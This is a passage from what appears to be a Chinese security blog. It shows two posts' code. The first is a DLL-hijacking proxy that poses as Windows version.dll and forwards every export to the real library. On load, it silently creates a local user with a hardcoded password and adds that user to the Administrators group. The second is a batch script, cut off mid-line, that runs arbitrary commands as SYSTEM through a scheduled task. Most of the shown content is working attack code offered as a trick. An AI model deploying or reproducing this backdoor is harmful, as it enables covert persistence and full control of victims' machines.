class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;lm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"Netapi32.lib"</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:GetFileVersionInfoA=_AheadLib_GetFileVersionInfoA,@1"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:GetFileVersionInfoByHandle=_AheadLib_GetFileVersionInfoByHandle,@2"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:GetFileVersionInfoExW=_AheadLib_GetFileVersionInfoExW,@3"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:GetFileVersionInfoSizeA=_AheadLib_GetFileVersionInfoSizeA,@4"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:GetFileVersionInfoSizeExW=_AheadLib_GetFileVersionInfoSizeExW,@5"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:GetFileVersionInfoSizeW=_AheadLib_GetFileVersionInfoSizeW,@6"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:GetFileVersionInfoW=_AheadLib_GetFileVersionInfoW,@7"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:VerFindFileA=_AheadLib_VerFindFileA,@8"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:VerFindFileW=_AheadLib_VerFindFileW,@9"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:VerInstallFileA=_AheadLib_VerInstallFileA,@10"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:VerInstallFileW=_AheadLib_VerInstallFileW,@11"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:VerLanguageNameA=_AheadLib_VerLanguageNameA,@12"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:VerLanguageNameW=_AheadLib_VerLanguageNameW,@13"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:VerQueryValueA=_AheadLib_VerQueryValueA,@14"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/EXPORT:VerQueryValueW=_AheadLib_VerQueryValueW,@15"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"netapi32.lib"</span>)</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 宏定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXTERNC extern <span class="meta-string">"C"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAKED __declspec(naked)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPORT __declspec(dllexport)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALCPP EXPORT NAKED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALSTD EXTERNC EXPORT NAKED void __stdcall</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALCFAST EXTERNC EXPORT NAKED void __fastcall</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALCDECL EXTERNC NAKED void __cdecl</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// AheadLib 命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> AheadLib</span><br><span class="line">&#123;</span><br><span class="line">HMODULE m_hModule = <span class="literal">NULL</span>;<span class="comment">// 原始模块句柄</span></span><br><span class="line">DWORD m_dwReturn[<span class="number">15</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">// 原始函数返回地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载原始模块</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> BOOL WINAPI <span class="title">Load</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR tzPath[MAX_PATH];</span><br><span class="line">TCHAR tzTemp[MAX_PATH * <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">GetSystemDirectory(tzPath, MAX_PATH);</span><br><span class="line">lstrcat(tzPath, TEXT(<span class="string">"\\version"</span>));</span><br><span class="line">m_hModule = LoadLibrary(tzPath);</span><br><span class="line"><span class="keyword">if</span> (m_hModule == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">wsprintf(tzTemp, TEXT(<span class="string">"无法加载 %s，程序无法正常运行。"</span>), tzPath);</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, tzTemp, TEXT(<span class="string">"AheadLib"</span>), MB_ICONSTOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (m_hModule != <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放原始模块</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> VOID WINAPI <span class="title">Free</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_hModule)</span><br><span class="line">&#123;</span><br><span class="line">FreeLibrary(m_hModule);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取原始函数地址</span></span><br><span class="line"><span class="function">FARPROC WINAPI <span class="title">GetAddress</span><span class="params">(PCSTR pszProcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FARPROC fpAddress;</span><br><span class="line">CHAR szProcName[<span class="number">16</span>];</span><br><span class="line">TCHAR tzTemp[MAX_PATH];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m_hModule == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Load() == FALSE)</span><br><span class="line">&#123;</span><br><span class="line">ExitProcess(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fpAddress = GetProcAddress(m_hModule, pszProcName);</span><br><span class="line"><span class="keyword">if</span> (fpAddress == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (HIWORD(pszProcName) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">wsprintf(szProcName, <span class="string">"%d"</span>, pszProcName);</span><br><span class="line">pszProcName = szProcName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wsprintf(tzTemp, TEXT(<span class="string">"无法找到函数 %hs，程序无法正常运行。"</span>), pszProcName);</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, tzTemp, TEXT(<span class="string">"AheadLib"</span>), MB_ICONSTOP);</span><br><span class="line">ExitProcess(<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> fpAddress;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> AheadLib;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="function">VOID <span class="title">adduser</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NET_API_STATUSnStatus;</span><br><span class="line">DWORD dwError= <span class="number">0</span>;</span><br><span class="line">DWORD dwLevel= <span class="number">1</span>;</span><br><span class="line">USER_INFO_1ui;</span><br><span class="line">ui.usri1_name= <span class="string">L"alibaba"</span>;   <span class="comment">//用户名</span></span><br><span class="line">ui.usri1_password= <span class="string">L"password123!@#"</span>;   <span class="comment">//密码</span></span><br><span class="line"><span class="comment">//ui.usri1_name= argv[1];</span></span><br><span class="line"><span class="comment">//ui.usri1_password= argv[1];</span></span><br><span class="line">ui.usri1_priv= USER_PRIV_USER;  <span class="comment">//权限</span></span><br><span class="line">ui.usri1_home_dir= <span class="literal">NULL</span>;</span><br><span class="line">ui.usri1_comment= <span class="literal">NULL</span>;</span><br><span class="line">ui.usri1_flags= UF_SCRIPT|UF_DONT_EXPIRE_PASSWD|UF_PASSWD_CANT_CHANGE; <span class="comment">//登录脚本执行，密码不可更改，密码永不过期</span></span><br><span class="line">ui.usri1_script_path = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">nStatus = NetUserAdd(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">dwLevel,</span><br><span class="line">(LPBYTE)&amp;ui,</span><br><span class="line">&amp;dwError</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOCALGROUP_MEMBERS_INFO_3 account;</span><br><span class="line">account.lgrmi3_domainandname=ui.usri1_name; <span class="comment">//传入用户名</span></span><br><span class="line"></span><br><span class="line">nStatus = NetLocalGroupAddMembers(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="string">L"Administrators"</span>,</span><br><span class="line"><span class="number">3</span>,</span><br><span class="line">(LPBYTE)&amp;account,</span><br><span class="line"><span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">&#123;</span><br><span class="line">DisableThreadLibraryCalls(hModule);</span><br><span class="line"><span class="comment">//MessageBoxW(NULL, L"DLL Hijack! by 360!!!", L":)", 0);</span></span><br><span class="line">adduser();</span><br><span class="line"><span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(m_dwReturn) / <span class="keyword">sizeof</span>(DWORD); i++)</span><br><span class="line">&#123;</span><br><span class="line">m_dwReturn[i] = TlsAlloc();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(m_dwReturn) / <span class="keyword">sizeof</span>(DWORD); i++)</span><br><span class="line">&#123;</span><br><span class="line">TlsFree(m_dwReturn[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Free();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_GetFileVersionInfoA</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"GetFileVersionInfoA"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_GetFileVersionInfoByHandle</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"GetFileVersionInfoByHandle"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_GetFileVersionInfoExW</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"GetFileVersionInfoExW"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_GetFileVersionInfoSizeA</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"GetFileVersionInfoSizeA"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_GetFileVersionInfoSizeExW</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"GetFileVersionInfoSizeExW"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_GetFileVersionInfoSizeW</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"GetFileVersionInfoSizeW"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_GetFileVersionInfoW</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"GetFileVersionInfoW"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_VerFindFileA</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"VerFindFileA"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_VerFindFileW</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"VerFindFileW"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_VerInstallFileA</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"VerInstallFileA"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_VerInstallFileW</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"VerInstallFileW"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_VerLanguageNameA</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"VerLanguageNameA"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_VerLanguageNameW</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"VerLanguageNameW"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_VerQueryValueA</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"VerQueryValueA"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="function">ALCDECL <span class="title">AheadLib_VerQueryValueW</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetAddress(<span class="string">"VerQueryValueW"</span>);</span><br><span class="line">__asm JMP EAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 奇淫巧技 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>runassystem bat实现</title>
      <link href="/2017/06/11/runassystem/"/>
      <url>/2017/06/11/runassystem/</url>
      
        <content type="html"><![CDATA[<p>该工具仅用作拥有administrator帐户以及非交互环境<br>交互环境下有多种方式获取system权限 如nircmd.exe psexec wimi sc …</p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/520e73427ccbf757a633ebd5778ddfe2.png" alt="2019-07-20-17-08-05"><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/f739c3b320977fda83545722615c1629.png" alt="2019-07-20-17-08-16"></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">ver</span>|<span class="built_in">findstr</span> "<span class="number">5</span>\.[<span class="number">0</span>-<span class="number">9</span>]\.[<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>]*" &gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span> &amp;&amp; (<span class="built_in">echo</span> [-] <span class="keyword">Not</span> Working <span class="keyword">for</span> winxp\win2k3 &amp;&amp;<span class="keyword">goto</span> :EOF)</span><br><span class="line"><span class="built_in">del</span> /f /q <span class="variable">%result_file%</span> &gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span></span><br><span class="line"><span class="built_in">Rd</span> "<span class="variable">%WinDir%</span>\system32\test_permissions" &gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span></span><br><span class="line"><span class="built_in">Md</span> "<span class="variable">%WinDir%</span>\System32\test_permissions" <span class="number">2</span>&gt;<span class="built_in">NUL</span>||(<span class="built_in">Echo</span>.&amp; [-] <span class="built_in">Echo</span> Run as administrator user. &amp;&amp;<span class="keyword">goto</span> :EOF)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> comands=%*</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> comands (</span><br><span class="line">    <span class="built_in">echo</span>.</span><br><span class="line">    <span class="built_in">echo</span> Run as SYSTEM  Account Tool</span><br><span class="line">    <span class="built_in">echo</span>.</span><br><span class="line">    <span class="built_in">echo</span> [-] error: The syntax of the command is incorrect.</span><br><span class="line">    <span class="built_in">echo</span>.</span><br><span class="line">    <span class="built_in">echo</span> <span class="built_in">Help</span>:</span><br><span class="line">    <span class="built_in">echo</span>       %~n0 command </span><br><span class="line">    <span class="keyword">goto</span> :EOF</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> result_file=<span class="variable">%tmp%</span>\command_result.txt</span><br><span class="line"></span><br><span class="line">schtasks.exe /create /ru "SYSTEM" /tn "runAsSystem" /sc DAILY /tr "<span class="built_in">cmd</span>.exe /c <span class="built_in">chcp</span> <span class="number">437</span>&gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span>&amp;&amp;<span class="variable">%comands%</span>&gt;&gt; <span class="variable">%result_file%</span>" /F &gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span></span><br><span class="line">schtasks.exe /run   /tn runAsSystem /i &gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span></span><br><span class="line"><span class="built_in">chcp</span> <span class="number">437</span>&gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span>&amp;&amp; schtasks.exe /query /tn runAsSystem /fo list| <span class="built_in">findstr</span> /i "Running"  &gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span> &amp;&amp; (<span class="keyword">goto</span> :Running ) || ( <span class="keyword">goto</span> :Ready)</span><br><span class="line"></span><br><span class="line">:Ready</span><br><span class="line"><span class="built_in">type</span> <span class="variable">%result_file%</span></span><br><span class="line">schtasks.exe  /delete /tn runAsSystem /f &gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span></span><br><span class="line"><span class="built_in">del</span> /f /q <span class="variable">%result_file%</span> &gt;<span class="built_in">NUL</span> <span class="number">2</span>&gt;<span class="built_in">NUL</span></span><br><span class="line"><span class="keyword">goto</span> :EOF</span><br><span class="line"></span><br><span class="line">:Running</span><br><span 